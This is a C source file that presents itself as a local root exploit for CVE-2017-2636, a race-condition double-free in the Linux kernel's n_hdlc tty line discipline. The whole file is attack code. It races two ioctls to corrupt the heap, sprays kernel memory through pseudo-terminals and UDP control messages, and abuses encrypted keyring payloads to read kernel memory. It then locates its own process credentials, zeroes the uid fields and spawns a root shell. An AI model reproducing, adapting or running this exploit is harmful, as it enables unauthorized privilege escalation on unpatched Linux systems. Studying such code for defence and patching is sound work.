/*
 * cve-2017-2636 exploit
 *
 * the race is between flush_tx_queue / n_hdlc_send_frames
 *	first, in n_hdlc_send_frames, make n_hdlc->tbuf = tbuf;
 *	2nd, race flush_tx_queue / n_hdlc_send_frames, put tbuf into list twice
 *	3rd, release the n_hdlc
 * [v] trigger double-free
 *
 * bypass smep/smap, maybe kaslr(not test)
 */
#define	_GNU_SOURCE
#include <netinet/ip.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <arpa/inet.h>

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/tty.h>
#include <termios.h>
#include <pthread.h>
#include <syscall.h>
#include <sys/time.h>
#include <sys/resource.h>
#include "keyutils.h"

void *race_on(void *arg)
{
	int fd = (int)arg;

	int err = ioctl(fd, TCXONC, TCOON);
	if (err == -1) {
		perror("ioctl");
		return (void *)-1;
	}
	return (void *)0;
}

void *race_flush(void *arg)
{
	int fd = (int)arg;

	int err = ioctl(fd, TCFLSH, TCIOFLUSH);
	if (err == -1) {
		perror("ioctl");
		return (void *)-1;
	}
	return (void *)0;
}

struct rcu_head {
	void		*next;
	void		*func;
};

struct enc_key_payload {
	struct rcu_head		rcu;
	char			*format;
	char			*master_desc;
	char			*datalen;
	char			*iv;
	char			*enc_data;
	unsigned short		datablob_len;
	unsigned short		decrypted_datalen;
	unsigned short		payload_datalen;
	unsigned short		enc_format;
	char			*decrypted_data;
	char			payload_data[0];
};

#define	fd_exp_cnts	20
int fd_exp[fd_exp_cnts] = { -1 };
key_serial_t key, key1, key2, userkey;

char *usertype = "user";
char *userdesc = "number0";
char userpayload[] = "hello_first_user_key";
size_t userplen = sizeof(userpayload);

char *type = "encrypted";
char *desc = "key number10";
char *desc1 = "key number11";
char *desc2 = "key number12";
char payload[] = "new default user:number0 3900";
char payload_last[] = "new default user:number0 30";
char payload_key1[] = "new default user:number1 3900";
char payload_key2[] = "new default user:number2 1024";
char upd_pld[] = "update default user:number0 3900";
size_t plen = sizeof(payload);
size_t pld_lastlen = sizeof(payload_last);
size_t upd_plen = sizeof(upd_pld);
key_serial_t keyring = KEY_SPEC_USER_KEYRING;

#define SPRAY0_BUF_LEN	4100
char buf[SPRAY0_BUF_LEN];
char buf_read[SPRAY0_BUF_LEN];
unsigned long search_addr_base = 0xffff880003000000;
unsigned long addr_inc = 0x2000;
char search_key[] = "default\x00user:number0\x00""3900";
unsigned long search_offs = sizeof(search_key) + sizeof("default");
#define	SPRAY0_BUF_LEN0 8192
char buf_padding[SPRAY0_BUF_LEN0];
char *real_master_desc, *real_format, *real_datalen;
char *modprobe_path = (void *)0xffffffff819f79a0; /* this is not important */
#define	CRED_UID_OFFS	4
#define	CRED_CLEAR_LEN  0x18
#define	INIT_TASK_ADDR	0xffffc90000214000
#define TARGET_COMM	"a.out"

void init_buf_spray(void)
{
	struct enc_key_payload *payload = (void *)buf;
	memset(&payload->rcu, 0, sizeof(payload->rcu));
	payload->master_desc = search_addr_base + search_offs;
	payload->format = payload->master_desc - sizeof("default") +
				sizeof(search_key);
	payload->datalen = payload->master_desc+sizeof("user:number0");
	payload->iv = 0;
	payload->enc_data = 0;
	payload->datablob_len = 0x8000;
	payload->decrypted_datalen = 0x8000;
	payload->payload_datalen = 0x8000;
	payload->enc_format = 0x10;
	payload->decrypted_data = 0;
	memcpy(payload->payload_data, search_key, sizeof(search_key));
}

void buf_spray_inc(void)
{
	struct enc_key_payload *payload = (void *)buf;
	payload->master_desc += addr_inc;
	payload->format = payload->master_desc - sizeof("default") +
				sizeof(search_key);
	payload->datalen = payload->master_desc+sizeof("user:number0");
	printf("now search %p\n", payload->master_desc);
}

struct list_head;
struct list_head {
	struct list_head *next, *prev;
};

struct task_struct {
	char padding0[0x430];
	struct list_head tasks;
	char padding1[0x230];
	char *cred;
	char comm[16];
};

int get_addr_info(int fd, key_serial_t key, void *addr, size_t size,
		  char *buf_ret, size_t buflen)
{
	/* first, write fd write_buf */
	struct enc_key_payload *payload = (void *)buf;
	payload->format = real_format;
	payload->datalen = modprobe_path;
	payload->iv = addr;
	payload->enc_data = 0;
	payload->datablob_len = size*2;
	payload->decrypted_datalen = 0x0;
	payload->payload_datalen = 0x100;
	payload->enc_format = 0x10;
	payload->decrypted_data = 0;
	write(fd, buf, SPRAY0_BUF_LEN);

	int err = syscall(__NR_keyctl, KEYCTL_READ, key, buf_ret, buflen);
	if ((err == -1) || (err > buflen)) {
		perror("keyctl_read");
		return -1;
	}
	return 0;
}

int hex_to_char(char *buf_src, char *ret)
{
	char c[2];
	c[0] = buf_src[0];
	c[1] = buf_src[1];
	int val = 0;

	if ((c[0] >= '0') && (c[0] <= '9')) {
		val += (c[0]-'0') * 16;
	} else if ((c[0] >= 'A') && (c[0] <= 'F')) {
		val += (c[0]-'A'+10) * 16;
	} else if ((c[0] >= 'a') && (c[0] <= 'f')) {
		val += (c[0]-'a'+10) * 16;
	} else {
		val = 0;
		fprintf(stderr, "format err\n");
		return -1;
	}

	if ((c[1] >= '0') && (c[1] <= '9')) {
		val += (c[1]-'0');
	} else if ((c[1] >= 'A') && (c[1] <= 'F')) {
		val += (c[1]-'A'+10);
	} else if ((c[1] >= 'a') && (c[1] <= 'f')) {
		val += (c[1]-'a'+10);
	} else {
		val = 0;
		fprintf(stderr, "format err\n");
		return -1;
	}
	*ret = (char)val;
	return 0;
}

int buf_to_task_struct(struct task_struct *task, char *buf_src)
{
	size_t chars_ign = sizeof("default user:number0 /sbin/modprobe");
	char *addr_begin = buf_src + chars_ign;
	size_t write = 0;
	char *addr_write = (char *)task;

	while (write < sizeof(*task)) {
		char c;
		int err = hex_to_char(addr_begin, &c);
		if (err == -1)
			return -1;
		*addr_write++ = c;
		write++;
		addr_begin += 2;
	}
	return 0;
}

int do_exploit(int fd, key_serial_t key)
{
	/* now we are about to get root */

	struct enc_key_payload *payload = (void *)buf;
	real_master_desc = payload->master_desc;
	real_format = real_master_desc-sizeof("default");
	real_datalen = real_master_desc+sizeof("user:number0");

	/* now, search for current process cred */
	char buf_tmp[0x8000];
	void *addr_base = (void *)INIT_TASK_ADDR;
	while (1) {
		memset(buf_tmp, 0, 0x8000);
		int err = get_addr_info(fd, key, addr_base,
					sizeof(struct task_struct),
					buf_tmp, 0x8000);
		if (err == -1) {
			fprintf(stderr, "get_addr_info err\n");
			goto err_exit;
		}

		struct task_struct task;
		memset(&task, 0, sizeof(task));
		buf_to_task_struct(&task, buf_tmp);
		if (strcmp(task.comm, TARGET_COMM) == 0) {
			fprintf(stderr, "got target\n");
			fprintf(stderr, "target cred at %p\n", task.cred);
			payload->decrypted_datalen = 0x18;
			payload->decrypted_data = task.cred+CRED_UID_OFFS;
			write(fd, buf, SPRAY0_BUF_LEN);

			syscall(__NR_keyctl, KEYCTL_REVOKE, key);
			usleep(90000);

			key = syscall(__NR_add_key, type, desc, payload_last,
					pld_lastlen, keyring);
			perror("add_key");
			sleep(1);
			if (getuid() == 0) {
				fprintf(stderr, "got root\n");
				execl("/bin/sh", "/bin/sh", NULL);
			}
			goto err_exit;
		}
		addr_base = (char *)(task.tasks.next) - (0x430);
	}

err_exit:
	syscall(__NR_keyctl, KEYCTL_REVOKE, key);
	syscall(__NR_keyctl, KEYCTL_REVOKE, key1);
	syscall(__NR_keyctl, KEYCTL_REVOKE, key2);
	syscall(__NR_keyctl, KEYCTL_REVOKE, userkey);
	exit(0);
}

int exploit(void)
{
	int i = 0;
	int err;
	int redo = 0;

	for (i = 0; i < fd_exp_cnts; i++) {
		/*
		 * XXX: we write some data to write_buf;
		 * then we update the key, if key return INVAL, then
		 * we spray successfully done
		 * then we use this key to test the kernel heap memory
		 *	to set the format/master_desc/datalen value
		 *	once update return -EDQUOT
		 *	then, we got the address
		 * reset the payload, and then check the running process.comm
		 * to get current process task_struct, then cred, then
		 * we free this key, to make it clear the area between
		 * cred->uid ...
		 */
redo_update:
		write(fd_exp[i], buf, SPRAY0_BUF_LEN);
		if (redo)
			read(fd_exp[i], buf_read, SPRAY0_BUF_LEN);
		err = syscall(__NR_keyctl,KEYCTL_UPDATE,key,upd_pld,upd_plen);
		if (err == -1) {
			if (!redo)
				fprintf(stderr, "looks like we won the race\n");
			if (errno == EINVAL) {
				redo = 1;
				buf_spray_inc();
				usleep(3000);
				goto redo_update;
			} else if (errno == EDQUOT) {
				fprintf(stderr, "got address\n");
				do_exploit(fd_exp[i], key);
			}
			exit(-1);
		}
	}
}

void prepare_fdexp(void)
{
	int i;
	for (i = 0; i < fd_exp_cnts; i++) {
		fd_exp[i] = open("/dev/ptmx", O_RDWR | O_NONBLOCK);
		if (fd_exp[i] == -1)
			continue;
		int n_hdlc = N_HDLC;
		int err = ioctl(fd_exp[i], TIOCSETD, &n_hdlc);
		if (err == -1) {
			close(fd_exp[i]);
			fd_exp[i] = -1;
		}
	}
}

void failed_fdexp(void)
{
	int i;
	for (i = 0; i < fd_exp_cnts; i++) {
		close(fd_exp[i]);
		fd_exp[i] = -1;
	}
}

int trigger(void)
{
	// init_buf_spray();
	// prepare_fdexp();

	int fd_cnts = 1;
	int fd[fd_cnts];		/* only use one fd to trigger */
	int i = 0;
	for (i = 0; i < fd_cnts; i++) {
		fd[i] = open("/dev/ptmx", O_RDWR);
		if (fd[i] == -1) {
			perror("open");
			goto err_out;
		}
		int n_hdlc = N_HDLC;
		int err = ioctl(fd[i], TIOCSETD, &n_hdlc);
		if (err == -1) {
			perror("ioctl");
			goto err_out;
		}

		char buf[100];
		memset(buf, 'B', 100);
		err = ioctl(fd[i], TCXONC, TCOOFF);
		if (err == -1) {
			perror("ioctl");
			goto err_out;
		}

		err = write(fd[i], buf, 100);
		if (err == -1) {
			perror("write");
			goto err_out;
		}

		pthread_t thread_on, thread_flush;
		pthread_create(&thread_on, NULL, race_on, fd[i]);
		pthread_create(&thread_flush, NULL, race_flush, fd[i]);

		pthread_join(thread_on, NULL);
		pthread_join(thread_flush, NULL);
	}

	for (i = 0; i < fd_cnts; i++) {
		close(fd[i]);
	}

	// exploit();

	// failed_fdexp();
	return 0;

err_out:
	for (i = 0; i < fd_cnts; i++)
		close(fd[i]);
	failed_fdexp();
	return 0;
}

#define	SOCK_SPRAY_THREADS	30
int init_server(struct sockaddr_in *si, int port)
{
	int sock;
	int err;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1) {
		perror("socket");
		return -1;
	}

	memset(si, 0, sizeof(*si));
	si->sin_family = AF_INET;
	si->sin_port = htons(port);
	si->sin_addr.s_addr = htonl(INADDR_ANY);

	err = bind(sock, (struct sockaddr *)si, sizeof(*si));
	if (err == -1) {
		perror("bind");
		close(sock);
		return -1;
	}

	return sock;
}

int init_client(struct sockaddr_in *si, int port)
{
	int sock;
	int err;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1) {
		perror("socket");
		return -1;
	}

	memset(si, 0, sizeof(*si));
	si->sin_family = AF_INET;
	si->sin_port = htons(port);

	err = inet_aton("127.0.0.1", &si->sin_addr);
	if (err == -1) {
		perror("inet_aton");
		close(sock);
		return -1;
	}

	return sock;
}

int client_sendmsg(int sock, struct sockaddr_in *si, char *buf, size_t len)
{
	int err;
	struct iovec iov;
	struct msghdr mh;

	memset(&iov, 0, sizeof(iov));
	memset(&mh, 0, sizeof(mh));

	iov.iov_base = buf;
	iov.iov_len = len;

	mh.msg_name = si;
	mh.msg_namelen = sizeof(struct sockaddr);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;
	mh.msg_control = buf;
	mh.msg_controllen = len;

	return sendmsg(sock, &mh, 0);
}

void *race_spray0(void *arg)
{
	struct sockaddr_in sersi, clisi;
	int serfd, clifd;
	int port = (int)arg;

	serfd = init_server(&sersi, port);
	if (serfd == -1) {
		fprintf(stderr, "init_server err\n");
		return (void *)-1;
	}

	clifd = init_client(&clisi, port);
	if (clifd == -1) {
		fprintf(stderr, "init_client err\n");
		close(serfd);
		return (void *)-1;
	}

	int times = 0x1000;
	while (times--) {
		client_sendmsg(clifd, &clisi, buf_padding, SPRAY0_BUF_LEN0);
	}

	close(serfd);
	close(clifd);
	return (void *)0;
}

void init_buf_padding(void)
{
	memcpy(buf_padding+0*sizeof(search_key), search_key, sizeof(search_key));
	memcpy(buf_padding+1*sizeof(search_key), search_key, sizeof(search_key));
	memset(buf_padding+2*sizeof(search_key), 'A',
			SPRAY0_BUF_LEN0-3*sizeof(search_key));
}

void inc_kernel_heap(void)
{
	init_buf_padding();

	struct rlimit rlim;
	int err = getrlimit(RLIMIT_NOFILE, &rlim);
	if (err == -1) {
		perror("getrlimit");
		exit(-1);
	}

	int max = rlim.rlim_cur - SOCK_SPRAY_THREADS*2;
	int fd[max];
	int i;
	for (i = 0; i < max; i++) {
		fd[i] = open("/dev/ptmx", O_RDWR);
		if (fd[i] == -1)
			continue;
		int n_hdlc = N_HDLC;
		int err = ioctl(fd[i], TIOCSETD, &n_hdlc);
		if (err == -1) {
			close(fd[i]);
			fd[i] = -1;
		}
		write(fd[i], buf_padding, SPRAY0_BUF_LEN0);
	}

	pthread_t sock_threads[SOCK_SPRAY_THREADS];
	int port = 13579;
	for (i = 0; i < SOCK_SPRAY_THREADS; i++)
		pthread_create(&sock_threads[i], NULL, race_spray0, port++);
	for (i = 0; i < SOCK_SPRAY_THREADS; i++)
		if (sock_threads[i])
			pthread_join(sock_threads[i], NULL);
}

int main(int argc, char *argv[])
{
	inc_kernel_heap();

	userkey = syscall(__NR_add_key, usertype, userdesc, userpayload,
				userplen, keyring);
	if (key == -1) {
		perror("add_key");
		return -1;
	}
	key = syscall(__NR_add_key, type, desc, payload, plen, keyring);
	if (key == -1) {
		perror("add_key");
		return -1;
	}
	key1 = syscall(__NR_add_key, type, desc1, payload_key1, plen, keyring);
	if (key == -1) {
		perror("add_key");
		return -1;
	}
	key2 = syscall(__NR_add_key, type, desc2, payload_key2, plen, keyring);
	if (key == -1) {
		perror("add_key");
		return -1;
	}

	do {
		trigger();
		usleep(1000);
	} while (1);

	/* never got here */
	return 0;
}
